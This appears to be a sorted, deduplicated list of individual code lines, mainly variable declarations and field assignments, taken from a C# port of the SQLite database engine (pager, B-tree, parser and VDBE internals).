      int iCur = pSrc.iCursor
      int iCurrent = 0
      int iDb
      int iDb = pData.iDb
      int iDbSrc
      int iDepth
      int iDestroyed = 0
      int iDummy = 0
      int iEnd
      int iEnd = iStart 
      int iEnd = sqlite3VdbeCurrentAddr( v )
      int iEndAfterTrigger = 0
      int iEndBeforeTrigger = 0
      int iFirst = iPage
      int iFrom
      int iIdx = 0
      int iIdx = pParse.nTab
      int iIdxCur
      int iLast
      int iLimit
      int iLimit = 0
      int iMem
      int iOffset
      int iOvflSpace = 0
      int iPage = pCur.iPage
      int iParent
      int iParm = pDest.iParm
      int iPtrmap
      int iReg
      int iReleaseReg = 0
      int iRootPage
      int iRowidReg = 0
      int iStatCur
      int iTab
      int iTab = pParse.nTab
      int iTab = pTab.tnum
      int iTabDb
      int iValue
      int iValue = 0
      int iZnum = 0
      int i_pMem = 0
      int idummy = 0
      int idx
      int idx = 0
      int idxLru
      int ii
      int inReg
      int inReg = target
      int inTrans = 0
      int incr = ( enc == SQLITE_UTF8 
      int ins
      int invert
      int isRealNum = 0
      int isThreadsafe
      int izIn = 0
      int izOut = 0
      int izWrite = 0
      int j
      int j = -1 - x
      int j = 0
      int j1
      int jointype = 0
      int journalFileSize
      int jrnlSize = 0
      int k
      int keyColumn = -1
      int labelCmpr
      int labelEnd
      int lastTokenParsed = -1
      int leafData
      int len
      int len = 0
      int len = 1
      int length
      int loc = seekResult
      int mask
      int mask = 0
      int match = 0
      int matchAll = (int)pInfo.matchAll
      int matchOne = (int)pInfo.matchOne
      int matchSet = (int)pInfo.matchSet
      int mem = 
      int memCnt = -1
      int memId
      int memId = 0
      int minLru
      int moreToDo = 1
      int mx = pParse.db.aLimit[SQLITE_LIMIT_COLUMN]
      int mxHeight = pParse.db.aLimit[SQLITE_LIMIT_EXPR_DEPTH]
      int mxSqlLen
      int n
      int n = ( nKey1 < nKey2 ) 
      int n = 0
      int n = sqlite3Strlen30( pTrigger.table )
      int nAlloc
      int nByte
      int nByte = 0
      int nByte = n
      int nByteWInfo
      int nCell
      int nCell = 0
      int nChar = 0
      int nCol
      int nCol = pIdx.nColumn
      int nColumn
      int nCompound
      int nCurrent = pPager.nSavepoint
      int nDestPgsz = sqlite3BtreeGetPageSize( p.pDest )
      int nEq
      int nEq = (int)pLevel.plan.nEq
      int nErr = 0
      int nExpr
      int nExpr = pOrderBy.nExpr
      int nExtra = 0
      int nField
      int nFrag
      int nFree
      int nFull
      int nHeader
      int nHeight = 0
      int nHidden = 0
      int nHr = 0
      int nIdx
      int nIn
      int nMaster
      int nMaxArgs = 0
      int nMaxCells = 0
      int nMin = pCur.pBt.usableSize 
      int nName
      int nName = sqlite3Strlen30( pDef.zName )
      int nName = sqlite3Strlen30( zName )
      int nNew = ( p.nOpAlloc != 0 
      int nNew = 0
      int nOff
      int nOld
      int nOp = p.nOp
      int nOrderBy
      int nOut
      int nOvfl
      int nPage
      int nPage = -1
      int nPage = 0
      int nPagesPerMapPage
      int nPat
      int nPathname = 0
      int nPattern
      int nPattern = 0
      int nPayload
      int nProgressOps = 0
      int nRead = iAmt
      int nRecyclable = 0
      int nRef
      int nRef = sqlite3PagerRefcount(pPager)
      int nReg
      int nRep
      int nRes
      int nResult
      int nResultCol
      int nRetry = 0
      int nSignificant = 0
      int nSize
      int nSkip = (iChild != 0 
      int nSrcPgsz = sqlite3BtreeGetPageSize( p.pSrc )
      int nStr
      int nTabName
      int nTerm
      int nTrans = 0
      int nUsable = pPage.pBt.usableSize
      int nWrite = 0
      int nWrite = iAmt
      int needPagerReset
      int neg = 0
      int negP2 = 0
      int newIdx = -1
      int newLocktype
      int nsd
      int nxDiv
      int offset
      int oldCell
      int oldIdx = -1
      int oldLimit
      int omitTable
      int onError
      int op
      int op = 0
      int op = pExpr.op
      int opProperty
      int openedTransaction = 0
      int orconf
      int outOffset = -1
      int overage
      int p0type
      int p5
      int pCell
      int pCellptr
      int pRight
      int pageFlags
      int pc
      int pcacheSize = sqlite3PcacheSize()
      int precision
      int pseudoTab = 0
      int ptr
      int r = 0
      int r1
      int r1 = sqlite3GetTempReg( pParse )
      int rc
      int rc = -1
      int rc = 0
      int rc = 1
      int rc = SQLITE_ERROR
      int rc = SQLITE_MISUSE
      int rc = SQLITE_NOMEM
      int rc = SQLITE_OK
      int rc = pPager.errCode
      int rc = sqlite3_initialize()
      int rc2 = SQLITE_OK
      int rc2 = rc 
      int rcauth
      int regAddrA
      int regAddrB
      int regArgs
      int regAutoinc
      int regAutoinc = 0
      int regBase
      int regData
      int regEof = 0
      int regEofA
      int regEofB
      int regFree1 = 0
      int regFree2 = 0
      int regFromSelect = 0
      int regIdxKey
      int regIns
      int regLimitA
      int regLimitB
      int regNewRowid
      int regOldRowid
      int regOutA
      int regOutB
      int regPrev
      int regRec
      int regRecord
      int regRecord = sqlite3GetTempReg( pParse )
      int regResult
      int regRow
      int regRowCount = 0
      int regRowSet = 0
      int regRowid
      int res = 0
      int res = 1
      int result = 0
      int rev = 0
      int s
      int savedFlags
      int savedLimit
      int savedOffset
      int saved_flags
      int saved_nChange
      int saved_nTotalChange
      int seen
      int sgn = 0
      int sign = 1
      int size
      int sortOrder = 0
      int sortOrderMask
      int spaceLeft
      int srcTab = 0
      int state = 0
      int stateno = pParser.yystack[pParser.yyidx].stateno
      int subtotal
      int szHdr = 0
      int szJ = 0
      int szNew = 0
      int szScratch
      int testAddr = 0
      int timeout = db.busyTimeout
      int tmask = 0
      int tnum
      int token
      int token = 0
      int tokenType = 0
      int top
      int topOfLoop
      int ts = getTempStore( zStorageType )
      int type
      int u
      int usableSize
      int usableSpace
      int v
      int v = pVdbe.aCounter[op - 1]
      int val
      int vals
      int width
      int yyact
      int yygoto
      int yysize
      int zCsr = 0
      int zDx = 0
      int zIdx = 0
      int zInLength = zIn.Length
      int zIndex = 0
      int zIndex = 5
      int zLoc = 0
      int zTerm = ( nByte >= 0 
      int[] a = new int[11]
      int[] a = pIdx.aiRowEst
      int[] aLabel = p.aLabel
      int[] aLen = null
      int[] aOffset = {
      int[] aPermute
      int[] aPermute = null
      int[] aRegIdx = null
      int[] aXRef = null
      int[] apDiv = new int[NB - 1]
      int[] cntNew = new int[NB 
      int[] szNew = new int[NB 
      interfaces.
      invalidateAllOverflowCache(pBt)
      invalidateOverflowCache(pCur)
      isAgg = ( p.selFlags 
      isCompound = p.pPrior != null
      isDistinct = ( p.selFlags 
      isMemDb = sqlite3PagerIsMemdb( sqlite3BtreePager( pMain ) )
      isView = pTab.pSelect != null
      iz
      j = 0
      j = zOut.Length
      jfd = isMainJrnl != 0 
      k
      k = 0
      k = sqlite3Strlen30( zStmt )
      labelCmpr = sqlite3VdbeMakeLabel( v )
      labelEnd = sqlite3VdbeMakeLabel( v )
      leafCorrection = (u16)(apOld[0].leaf 
      leafData = apOld[0].hasData
      len = sqlite3Strlen30( zIdxName )
      lenRowid = (u32)sqlite3VdbeSerialTypeLen( typeRowid )
      length = 0
      list.
      loc == 0 
      long got
      long iLimit
      long rc
      long wrote = 0
      m.db = db
      m.db = null
      m.flags = 0
      magic != SQLITE_MAGIC_BUSY ) return false
      magic != SQLITE_MAGIC_OPEN 
      magic = db.magic
      mask 
      mask = (int)( (u32)1 ) << i
      mask = (int)sqlite3_user_data( context ) == 0 
      mem0 = new Mem0Global()
      mem0.alarmArg = pArg
      mem0.alarmCallback = xCallback
      mem0.alarmThreshold = iThreshold
      mem1.db = pKeyInfo.db
      mem1.enc = pKeyInfo.enc
      mem1.flags = 0
      mem1.u.i = 0
      memcpy(
      minLru = 0x7fffffff
      moved to the free-list - the freePage() code has taken care
      mutex = p.pSrcDb.mutex
      mutex = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER )
      mxPage = pagerPagecount(pBt)
      mxSqlLen = db.aLimit[SQLITE_LIMIT_SQL_LENGTH]
      n 
      n ) % 127
      n = (int)( (PCache1)p ).nPage
      n = (int)( pBegin.z.Length - sEnd.z.Length )
      n = 0
      n = nBuf
      n = nKey1 < nKey2 
      n = nResColumn 
      n = p.pBt.pageSize - p.pBt.usableSize
      n = pList.nExpr
      n = pMem.n
      n = pPage.childPtrSize
      n = pParse.nRangeReg
      n = sqlite3Strlen30( z )
      n = sqlite3_column_count( pStmt )
      n = sqlite3_value_bytes( argv[0] )
      n = sqlite3_value_int( argv[0] )
      n = sqlite3_value_int64( argv[0] )
      n--
      nAlloc = ( ( ( pNew.nCol - 1 ) / 8 ) 
      nByte = -1
      nCell = pPage.nCell
      nCol = pIdx.nColumn
      nCol = pList.nExpr
      nCol = pTab.nCol
      nColumn = nResultCol
      nCompound = 0
      nExpr = pList.nExpr
      nExtra = ROUND8( nExtra )
      nField = pKeyInfo.nField
      nFrag = data[hdr 
      nFull = sqlite3GlobalConfig.m.xRoundup( n )
      nHeader 
      nHeader = 0
      nIn = sqlite3_value_bytes( argv[0] )
      nKey = (u32)(pPage.intKey != 0 
      nMaxCells = (nMaxCells 
      nMem 
      nName = sqlite3Strlen30( zName )
      nNew = p.nHash 
      nNew >= 2 
      nNew >= 3 
      nNew >= 4 
      nNew >= 5 
      nOld = sqlite3MallocSize( pOld )
      nOld >= 2 
      nOld >= 3 
      nOrderBy = pOrderBy.nExpr
      nOut = nStr 
      nOvfl = (int)((info.nPayload - info.nLocal 
      nPagesPerMapPage = (pBt.usableSize / 5) 
      nPat = sqlite3_value_bytes( argv[0] )
      nPattern = sqlite3_value_bytes( argv[1] )
      nPayload = nData 
      nPinned = pCache.nPage - pCache.nRecyclable
      nPinned >= ( pcache1.nMaxPage 
      nQPlan = 0
      nRef = sqlite3PagerRefcount(pBt.pPager)
      nReg = (int)( pLevel.plan.nEq 
      nRep = sqlite3_value_bytes( argv[2] )
      nRes = sqlite3BtreeGetReserve( pMain )
      nResult = pSelect.pEList.nExpr
      nSize 
      nStr = sqlite3_value_bytes( argv[0] )
      nTerm = pOrderBy.nExpr
      nameToken.n = sqlite3Strlen30( nameToken.z )
      nameToken.z = pTrig.name
      nc = new NameContext()
      nc.allowAgg = 1
      nc.nErr = 0
      nc.pEList = pEList
      nc.pParse = pParse
      nc.pSrcList = pSelect.pSrc
      need to be added to the string.</li>
      needPagerReset = isHot
      needQuote = sqlite3Isdigit( zIdent[0] ) 
      newCell = pBt.pTmpSpace
      newLocktype = pFile.locktype
      new_elem = new HashElem()
      new_elem.data = data
      new_elem.nKey = nKey
      new_elem.pKey = pKey
      new_ht = new _ht[new_size]
      notReady 
      notReady = 
      now
      null                 /
      null              /
      object pAppData
      object pOld
      object pRet
      of those.
      offset 
      okOnePass = pWInfo.okOnePass
      oldLimit = db.aLimit[limitId]
      omitTable = ( ( pLevel.plan.wsFlags 
      op 
      op = ( ( pExpr.op 
      op = p.op
      op = pExpr.op
      or _MEMORY.
      origPgno = pPg.pgno
      outOffset = -1
      overage = (int)( sqlite3_memory_used() - n )
      overflow pages used by these cells may need to be updated
      ovflPageSize = (u16)(pBt.usableSize - 4)
      p = a[0]
      p = db.pVdbe
      p = new Bitvec()
      p = new Btree()
      p = new DateTime()
      p = new Vdbe()
      p = new char[n]
      p = null
      p = pColl
      p = pList
      p = pMem._SumCtx
      p = pNext
      p = pOrderBy.a[0].pExpr
      p = pParse.pNewTable
      p = pRowSet.pTree
      p = pcache1Alloc( sz )
      p = ppList
      p = sqlite3GlobalConfig.m.xMalloc( nFull )
      p = sqlite3Malloc( n )
      p->pVTable = pRet
      p->pVtab = 0
      p.Clear()
      p.D = D
      p.M = M
      p.Y = neg 
      p._MD5Context = null
      p._Mem = null
      p._SumCtx = null
      p.aColName = new Mem[n]
      p.aCol[p.nCol - 1].notNull = (u8)onError
      p.aCol[p.nCol] = new Column()
      p.aMem = new Mem[p.nField 
      p.bPurgeable = bPurgeable
      p.cacheCtr = 1
      p.contextStack = null
      p.contextStackDepth = 0
      p.contextStackTop = 0
      p.db = db
      p.db = null
      p.endpoint = new FilePoint()
      p.errorAction = OE_Abort
      p.expired = false
      p.explain 
      p.flags 
      p.flags = 0
      p.h = h
      p.h = s / 3600
      p.iJD = (long)( ( X1 
      p.iJD = (sqlite3_int64)( r 
      p.iLimit = regLimitB
      p.iLimit = savedLimit
      p.iOffset = 0
      p.iOffset = savedOffset
      p.iStatement = 0
      p.inTrans = TRANS_NONE
      p.isAttached = 1
      p.isPrepareV2 = isPrepareV2 != 0
      p.isSorted = true
      p.m = m
      p.m = s / 60
      p.magic = VDBE_MAGIC_DEAD
      p.magic = VDBE_MAGIC_HALT
      p.magic = VDBE_MAGIC_INIT
      p.magic = VDBE_MAGIC_RUN
      p.minWriteFileFormat = 255
      p.mxAlloc = mx
      p.n = 0
      p.nAlloc = n
      p.nArg = (i16)nArg
      p.nChange = 0
      p.nChar 
      p.nChar = 0
      p.nCol
      p.nField = (u16)( pKeyInfo.nField 
      p.nField = (u16)u
      p.nFresh = 0
      p.nFresh--
      p.nHeight = nHeight 
      p.nMax = 100
      p.nOp
      p.nOpAlloc = nNew
      p.nRef
      p.nRef--
      p.nResColumn = (u16)nResColumn
      p.nSet
      p.pChunk = null
      p.pDirty = pPage
      p.pEntry = null
      p.pEntry = pEntry
      p.pFKey = pFKey
      p.pFirst = null
      p.pFresh[p.pFresh.Length - p.nFresh] = new RowSetEntry()
      p.pKeyInfo = pKeyInfo
      p.pLast = null
      p.pLast = pEntry
      p.pLeft = p.pRight = null
      p.pLeft = pLeft
      p.pLimit = null
      p.pMethods = MemJournalMethods
      p.pNext = db.pVdbe
      p.pNext = pp
      p.pOffset = null
      p.pOrderBy = pOrderBy
      p.pPrev = null
      p.pPrior = null
      p.pPrior = pPrior
      p.pResultSet = new Mem[p.nMem]
      p.pResultSet = null
      p.pStress = pStress
      p.pTree = null
      p.pUserData = pUserData
      p.pc = -1
      p.pgno = newPgno
      p.rc = SQLITE_OK
      p.rc = rc
      p.readOnly = true
      p.readpoint = new FilePoint()
      p.readpoint.iOffset = (int)( iOfst 
      p.readpoint.pChunk = pChunk
      p.s 
      p.s -= s
      p.s = s 
      p.s = s / 1000.0
      p.selFlags 
      p.szExtra = szExtra
      p.szPage = szPage
      p.tooBig = 0
      p.trace = trace
      p.tz = 0
      p.tz = sgn 
      p.u.aHash[h] = i
      p.u.iValue = atoi( pToken.z.Substring( 1 ) )
      p.useMalloc = 1
      p.usesStmtJournal = false
      p.validHMS = 0
      p.validHMS = 1
      p.validJD = 0
      p.validJD = 1
      p.validTZ = (byte)( ( p.tz != 0 ) 
      p.validTZ = 0
      p.validYMD = 0
      p.validYMD = 1
      p.xDel = null
      p.xFinalize = xFinal
      p.xFunc = xFunc
      p.xStep = xStep
      p.xStress = xStress
      p.z = null
      p.zBLOB = null
      p.zText = new StringBuilder()
      p.zText = p.zBase = zBase
      p0type = sqlite3_value_type( argv[0] )
      p1 = sqlite3_value_int( argv[1] )
      pA.CopyTo( tmp )
      pA.pNext = pB.pNext
      pA.pPrev = pB.pPrev
      pA.zSql = pB.zSql
      pAccum = pMem._StrAccum
      pAggInfo.directMode = 0
      pAggInfo.directMode = 1
      pAmt = (int)nLocal
      pArray[pnEntry] = new T()
      pAuxData = pVdbeFunc.apAux[iArg]
      pAuxData.pAux = pAux
      pAuxData.xDelete = xDelete
      pB.CopyTo( pA )
      pB.pNext = pTmp
      pB.pPrev = pTmp
      pB.zSql = zTmp
      pBitvec = sqlite3BitvecCreate( sz )
      pBlob = sqlite3_value_blob( argv[0] )
      pBt = pCheck.pBt
      pBt = pPage.pBt
      pBt = pParent.pBt
      pBt.maxLeaf = (u16)(pBt.usableSize - 35)
      pBt.maxLocal = (u16)((pBt.usableSize - 12) 
      pBt.minLeaf = (u16)((pBt.usableSize - 12) 
      pBt.minLocal = (u16)((pBt.usableSize - 12) 
      pBt.pCursor = pCur
      pBt.pHasContent = null
      pBt.pPage1 = null
      pBt.pPage1 = pPage1
      pBt.pTmpSpace = null
      pBt.pageSizeFixed = true
      pBt.usableSize = (u16)(pBt.pageSize - nReserve)
      pBuf = 0
      pCache = new PCache1()
      pCache = p.pCache
      pCache.apHash[h] = pPage
      pCache.nMax = mxPage
      pCache.nPage 
      pCache.nPage--
      pCache.nRef--
      pCache.pSynced = pCache.pDirtyTail
      pCache.szPage = szPage
      pCellptr = pPage.cellOffset 
      pCheck.mxErr--
      pCheck.nErr
      pChild.nOverflow = pRoot.nOverflow
      pChunk = p.pFirst
      pCol = p.aCol[p.nCol - 1]
      pCol = p.aCol[p.nCol]
      pCol = pNew.aCol[pNew.nCol - 1]
      pCol.affinity = SQLITE_AFF_NONE
      pCol.affinity = sqlite3AffinityType( pCol.zType )
      pCol.zName = z
      pColName = p.aColName[idx 
      pColl = sqlite3GetFuncCollSeq( context )
      pCost = new WhereCost()
      pCost.plan.wsFlags = (u32)( pCost.plan.wsFlags 
      pCost.rCost = SQLITE_BIG_DBL
      pCtx.isError = SQLITE_ERROR
      pCtx.isError = SQLITE_NOMEM
      pCtx.isError = errCode
      pCur = pBt.pCursor
      pCur.aiIdx[0] = 0
      pCur.aiIdx[i 
      pCur.apPage[i 
      pCur.apPage[pCur.iPage].pgno
      pCur.atLast = 0
      pCur.cachedRowid = 0
      pCur.eState = CURSOR_INVALID
      pCur.iPage
      pCur.iPage = -1
      pCur.iPage--
      pCur.info.nSize = 0
      pCur.pBt = pBt
      pCur.pBtree = p
      pCur.pKey = null
      pCur.pKeyInfo = pKeyInfo
      pCur.pNext = pBt.pCursor
      pCur.pgnoRoot = (Pgno)iTable
      pCur.skipNext = 0
      pCur.validNKey = false
      pCur.wrFlag = (u8)wrFlag
      pCurrent = wsdStat.nowValue[op]
      pDb = db.aDb[db.nDb - 1]
      pDb = db.aDb[iDb]
      pDb.pBt = null
      pDb.pSchema = null
      pDb.pSchema.enc = ENC( db )
      pDb.pSchema.file_format = (u8)meta[BTREE_FILE_FORMAT - 1]
      pDb.pSchema.schema_cookie = (int)meta[BTREE_SCHEMA_VERSION - 1]
      pDbPage.pgno = iFreePage
      pDel->xDestroy(pDel->pAux)
      pDerived.flags = (u16)( pDerived.flags 
      pDerived.iRightJoinTable = pBase.iRightJoinTable
      pDest.affinity = '
      pDest.eDest = (u8)eDest
      pDest.iMem = 0
      pDest.iMem = dest.iMem
      pDest.iParm = iParm
      pDest.nMem = 0
      pDest.nMem = dest.nMem
      pDflt = pCol.pDflt
      pEList = p.pEList
      pEList = pExpr.x.pList
      pEList = pSelect.pEList
      pEType = pPtrmap[offset]
      pEngine = sqlite3ParserAlloc()
      pEntry = null
      pEntry = p.pFresh[p.pFresh.Length - p.nFresh]
      pEntry.pRight = null
      pEntry.v = rowid
      pExists = 0
      pExpr = p.pEList.a[0].pExpr
      pExpr = pEList.a[0].pExpr
      pExpr = pTerm.pExpr
      pExpr.CopyFrom( pDup )
      pExpr.iTable = -1
      pExpr.op = TK_COLUMN
      pExpr.op == TK_GT 
      pExpr.op == TK_NE )
      pExpr.pLeft = null
      pExpr.pLeft.flags = (u16)( ( pExpr.pLeft.flags 
      pExpr.pRight = null
      pExpr.pRight.flags = (u16)( ( pExpr.pRight.flags 
      pExpr.pTab = null
      pFKey = new FKey()
      pFKey = null
      pFKey.aCol = new FKey.sColMap[nCol]
      pFKey.aCol[0] = new FKey.sColMap()
      pFKey.deleteConf = (u8)( flags 
      pFKey.insertConf = (u8)( ( flags >> 16 ) 
      pFKey.isDeferred = (u8)isDeferred
      pFKey.isDeferred = 0
      pFKey.nCol = nCol
      pFKey.pFrom = p
      pFKey.pNextFrom = p.pFKey
      pFKey.updateConf = (u8)( ( flags >> 8 ) 
      pFile = new sqlite3_file()
      pFile.Clear()
      pFile.fs = fs
      pFile.fs.Flush()
      pFile.lastErrno = NO_ERROR
      pFile.locktype = (u8)locktype
      pFile.locktype = (u8)newLocktype
      pFile.pMethods = winIoMethod
      pFix.pName = pName
      pFix.pParse = pParse
      pFix.zDb = db.aDb[iDb].zName
      pFix.zType = zType
      pFrom.CopyTo( pTo )
      pFrom.flags = MEM_Null
      pFrom.xDel = null
      pFrom.z = null
      pFrom.zBLOB = null
      pGroupBy = p.pGroupBy
      pH.count
      pH.count = 0
      pH.count--
      pH.first = null
      pH.ht = new_ht
      pH.ht = null
      pH.htsize = 0
      pH.htsize = new_size
      pHash = pDb.pSchema.idxHash
      pHash = pDb.pSchema.tblHash
      pHaving = p.pHaving
      pHighwater = wsdStat.mxValue[op]
      pIdx = i
      pIdx = pLevel.plan.u.pIdx
      pIdx = pnEntry
      pIdx = top
      pIndex = new Index()
      pIndex.aSortOrder = new byte[nCol 
      pIndex.aiColumn = new int[nCol 
      pIndex.aiRowEst = new int[nCol 
      pIndex.autoIndex = (u8)( pName == null 
      pIndex.azColl = new string[nCol]
      pIndex.nColumn = pList.nExpr
      pIndex.onError = (u8)onError
      pIndex.pSchema = db.aDb[iDb].pSchema
      pIndex.pTable = pTab
      pInfo = new KeyInfo()
      pInfo.aCol = sqlite3ArrayAllocate(
      pInfo.aFunc = sqlite3ArrayAllocate(
      pInfo.iCell = iCell
      pInfo.nHeader = n
      pInfo.nPayload = nPayload
      pInfo.pCell = pCell
      pIsNocase = ( pDef.flags 
      pItem = p.a[p.nSrc - 1]
      pItem = pList.a[pList.nSrc - 1]
      pItem = pSelect.pSrc.a[0]
      pItem.pOn = pOn
      pItem.pSelect = pSubquery
      pItem.pTab = pTab
      pItem.pUsing = pUsing
      pJournal = new sqlite3_file()
      pKeyInfo = pPKey2.pKeyInfo
      pLast = p.pLast
      pLeft = pList.a[1].pExpr
      pLeft.flags 
      pLeftmost = p
      pLevel = pWInfo.a[iLevel]
      pList = p.pRight
      pList = pExpr.x.pList
      pList.a = (IdList_item[])sqlite3ArrayAllocate(
      pMain = db.aDb[0].pBt
      pMaskSet = new WhereMaskSet()
      pMaskSet = pWC.pMaskSet
      pMaskSet.ix[pMaskSet.n
      pMaster = new sqlite3_file()
      pMaster = sqlite3MutexAlloc( SQLITE_MUTEX_STATIC_MASTER )
      pMaxFuncArgs = nMaxArgs
      pMem = p.pMem
      pMem = p.pResultSet[i_pMem
      pMem.enc = ( enc == 0 
      pMem.enc = SQLITE_UTF8
      pMem.flags 
      pMem.flags = MEM_Blob 
      pMem.flags = MEM_Int
      pMem.flags = flags
      pMem.n = 0
      pMem.n = amt
      pMem.n = nByte
      pMem.n = sqlite3Strlen30( pMem.z )
      pMem.r = sqlite3VdbeRealValue( pMem )
      pMem.type = ( enc == 0 
      pMem.type = SQLITE_BLOB
      pMem.type = SQLITE_INTEGER
      pMem.type = SQLITE_NULL
      pMem.u.i = doubleToInt64( pMem.r )
      pMem.u.i = sqlite3VdbeIntValue( pMem )
      pMem.u.i = val
      pMem.u.nZero = n
      pMem.xDel = null
      pMem.z = null
      pMem.zBLOB = null
      pNC = pWalker.u.pNC
      pNC.hasAgg = 0
      pNew = new Expr()
      pNew = new ExprList()
      pNew = new IdList()
      pNew = new Select()
      pNew = new SrcList()
      pNew = new Table()
      pNew = pParse.pNewTable
      pNew.a = new ExprList_item[p.nExpr]
      pNew.a = new IdList_item[p.nId]
      pNew.aCol = new Column[nAlloc]
      pNew.addColOffset = pTab.addColOffset
      pNew.addrOpenEphm[0] = -1
      pNew.addrOpenEphm[1] = -1
      pNew.addrOpenEphm[2] = -1
      pNew.count = 0
      pNew.dbMem = pTab.dbMem
      pNew.first = null
      pNew.ht = null
      pNew.htsize = 0
      pNew.iECursor = 0
      pNew.iLimit = 0
      pNew.iOffset = 0
      pNew.nCol = pTab.nCol
      pNew.nExpr = pNew.nAlloc = p.nExpr
      pNew.nId = pNew.nAlloc = p.nId
      pNew.nRef = 1
      pNew.nSrc = pNew.nAlloc = p.nSrc
      pNew.op = TK_SELECT
      pNew.op = p.op
      pNew.pEList = pEList
      pNew.pGroupBy = pGroupBy
      pNew.pHaving = pHaving
      pNew.pLimit = pLimit
      pNew.pOffset = pOffset
      pNew.pOrderBy = pOrderBy
      pNew.pRightmost = null
      pNew.pSchema = db.aDb[iDb].pSchema
      pNew.pSrc = pSrc
      pNew.pWhere = pWhere
      pNew.selFlags = (u16)( isDistinct != 0 
      pNew.selFlags = (u16)( p.selFlags 
      pNew.x.pList = pList
      pOffset 
      pOld = db.pCommitArg
      pOld = db.pProfileArg
      pOld = db.pTraceArg
      pOp = p.aOp[0]
      pOp = p.aOp[addr]
      pOp = p.aOp[i]
      pOp.opcode = (u8)op
      pOp.p1 = p1
      pOp.p2 = p2
      pOp.p3 = p3
      pOp.p4.p = null
      pOp.p4type = P4_NOTUSED
      pOp.p5 = 0
      pOp.zComment = null
      pOrInfo.indexable = indexable
      pOrWc = pOrInfo.wc
      pOrderBy = p.pOrderBy
      pOrderBy = pSelect.pOrderBy
      pOrig = pEList.a[iCol].pExpr
      pOut.Write( zOut )
      pOut.zEnd = pEnd.z.Substring(pEnd.n)
      pOut.zEnd = pOperand.zEnd
      pOut.zEnd = pPostOp.z.Substring(pPostOp.n)
      pOut.zEnd = pRight.zEnd
      pOut.zEnd = pValue.z.Substring(pValue.n)
      pOut.zStart = pLeft.zStart
      pOut.zStart = pOperand.zStart
      pOut.zStart = pPreOp.z
      pOut.zStart = pStart.z
      pOut.zStart = pValue.z
      pOuterNC = pWalker.u.pNC
      pP1 = pBt.pPage1
      pP1 = pBt.pPage1.aData
      pPage = pCur.apPage[iCellDepth]
      pPage = pCur.apPage[pCur.iPage]
      pPage = sqlite3PagerGetExtra(pData)
      pPage.aData = sqlite3PagerGetData(pDbPage)
      pPage.cellOffset = first
      pPage.childPtrSize = (u8)(4 - 4 
      pPage.hdrOffset = (u8)(pPage.pgno == 1 
      pPage.hdrOffset = hdr
      pPage.iKey = iNew
      pPage.isInit = 0
      pPage.isInit = 1
      pPage.isInit = isInitOrig
      pPage.leaf = (u8)(flagByte >> 3)
      pPage.maskPage = (u16)(pBt.pageSize - 1)
      pPage.nCell = (u16)nCell
      pPage.nCell = 0
      pPage.nCell--
      pPage.nFree 
      pPage.nFree -= (u16)(nCell 
      pPage.nFree = (u16)(pBt.usableSize - first)
      pPage.nFree = (u16)(pPage.nFree 
      pPage.nOverflow = 0
      pPage.pBt = pBt
      pPage.pDbPage = pDbPage
      pPage.pDirtyNext = null
      pPage.pDirtyNext = p.pDirty
      pPage.pDirtyPrev = null
      pPage.pNext = pCache.apHash[h]
      pPage.pgno = pgno
      pPage1 = pBt.pPage1
      pPager = new Pager()
      pPager = pList.pPager
      pPager.aSavepoint = null
      pPager.changeCountDone = pPager.tempFile
      pPager.cksumInit = (u32)i64Temp
      pPager.dbModified = false
      pPager.dbModified = true
      pPager.dbOrigSize = 0
      pPager.dbSize = nPage
      pPager.dbSize = pSavepoint != null 
      pPager.dbSizeValid = memDb!=0
      pPager.errCode = 0
      pPager.errCode == SQLITE_FULL 
      pPager.errCode == SQLITE_OK 
      pPager.exclusiveMode = false
      pPager.exclusiveMode = tempFile != 0
      pPager.fd = new sqlite3_file()
      pPager.fd.pMethods == null 
      pPager.fullSync = ( level == 3 
      pPager.fullSync = pPager.noSync
      pPager.jfd = new sqlite3_file()
      pPager.journalHdr = pPager.journalOff = journalHdrOffset( pPager )
      pPager.journalOff 
      pPager.journalOff = 0
      pPager.journalOff = journalHdrOffset( pPager )
      pPager.journalSizeLimit = SQLITE_DEFAULT_JOURNAL_SIZE_LIMIT
      pPager.memDb = memDb
      pPager.mxPgno = SQLITE_MAX_PAGE_COUNT
      pPager.nExtra = (u16)nExtra
      pPager.nSavepoint = 0
      pPager.nSubRec = 0
      pPager.needSync = !pPager.noSync
      pPager.needSync = false
      pPager.noReadlock = (u8)( noReadlock 
      pPager.noSync = ( level == 1 
      pPager.noSync = pPager.tempFile
      pPager.pBusyHandlerArg = pBusyHandlerArg
      pPager.pInJournal = sqlite3BitvecCreate( pPager.dbSize )
      pPager.pPCache = new PCache()
      pPager.pVfs = pVfs
      pPager.readOnly = readOnly
      pPager.setMaster = 0
      pPager.setMaster = 1
      pPager.sjfd = new sqlite3_file()
      pPager.subjInMemory = (u8)subjInMemory
      pPager.sync_flags = SQLITE_SYNC_NORMAL
      pPager.sync_flags = bFullFsync 
      pPager.tempFile = tempFile != 0
      pPager.useJournal = (u8)( useJournal 
      pPager.vfsFlags = (u32)vfsFlags
      pPager.xBusyHandler = xBusyHandler
      pPager.xReiniter = xReinit
      pParse = new Parse()
      pParse = pNC.pParse
      pParse = pWInfo.pParse
      pParse = pWalker.pParse
      pParse->regRowid
      pParse->sNameToken.n = (int)(pEnd->z - pParse->sNameToken.z) 
      pParse.ResetMembers()
      pParse.RestoreMembers()
      pParse.SaveMembers()
      pParse.colNamesSet = 1
      pParse.cookieGoto = 0
      pParse.cookieMask = 0
      pParse.db = db
      pParse.explain = (byte)explainFlag
      pParse.iCacheLevel
      pParse.iCacheLevel -= N
      pParse.nErr
      pParse.nErr = 0
      pParse.nMem 
      pParse.nMem = 0
      pParse.nMem = 2
      pParse.nSet = 0
      pParse.nTab = 0
      pParse.nVar = 0
      pParse.nested
      pParse.nested--
      pParse.pNewTable = pNew
      pParse.pNewTable = pTable
      pParse.pNewTrigger = null
      pParse.pNewTrigger = pTrigger
      pParse.parseError = 1
      pParse.rc = SQLITE_ERROR
      pParse.rc = SQLITE_OK
      pParse.sNameToken = pName
      pParse.writeMask 
      pParse.zAuthContext = pSubitem.zName
      pParse.zAuthContext = zSavedAuthContext
      pParse.zTail = new StringBuilder( zSql )
      pParse.zTail = new StringBuilder( zSql.Length <= i 
      pParser = null
      pParser.yyidx--
      pPayload = pCell
      pPayloadIndex = nHeader
      pPg.flags 
      pPgnoNext = next
      pPrev = null
      pPrior = p.pPrior
      pPrior = pCell
      pPrior.iLimit = regLimitA
      pPrior.pRightmost = null
      pPriorIndex = info.iOverflow
      pProbe = pSrc.pTab.pIndex
